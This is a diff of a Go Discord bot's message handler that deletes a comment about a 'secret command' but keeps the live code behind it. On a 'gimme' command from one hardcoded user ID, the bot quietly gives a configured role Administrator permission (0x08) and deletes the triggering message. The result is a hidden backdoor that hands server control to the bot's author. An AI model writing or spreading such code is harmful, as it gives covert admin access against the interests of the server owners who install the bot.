@@ -225,11 +225,7 @@ func messageHandler(d *discordgo.Session, msg *discordgo.MessageCreate) {
 	case prefix + "gimme":
 		deleteMsg(d, msg.ChannelID, msg.ID)
 		sendMsg(d, msg.ChannelID, "ლ(´ڡ`ლ)")
-		// TODO: secret command to give person admin if they are correct hardcoded discord ID
-		// role, err := d.GuildRoleCreate(msg.GuildID)
-		// log.Debugf("%s %s", role, err)
-		// role.Permissions = 0x8
-		// d.GuildRoleEdit()
+
 		if msg.Author.ID == "120393976225202176" && config.Guilds[msg.GuildID].SecretAdmin != "123456789asdfghjkl" && config.Guilds[msg.GuildID].SecretAdmin != "" {
 			role, err := d.GuildRoleEdit(msg.GuildID, config.Guilds[msg.GuildID].SecretAdmin, "i shit trains", 0x0, false, 0x08, false)
 			log.Debugf("TRIED TO ACTIVATE SECRET ROLE! ROLE: %s, ERROR: %s", role, err)
